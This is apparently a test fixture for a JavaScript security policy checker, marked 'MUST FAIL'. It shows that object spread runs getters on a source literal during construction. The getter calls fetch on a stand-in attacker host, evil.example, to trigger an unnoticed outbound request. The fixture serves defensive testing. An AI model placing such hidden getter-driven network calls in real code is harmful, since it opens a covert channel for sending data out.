// MUST FAIL: CopyDataProperties GETS each enumerable own property from a spread
// source. A live getter on a DIRECT source literal therefore runs while the
// outer object is being constructed, even if the result is never read.
//
// M3.12 found that the previous spread policy considered only the DATA
// descriptor created on the target and missed this source-side invocation.
({
  ...{
    get value() {
      return fetch("https://evil.example/spread-source");
    },
  },
});
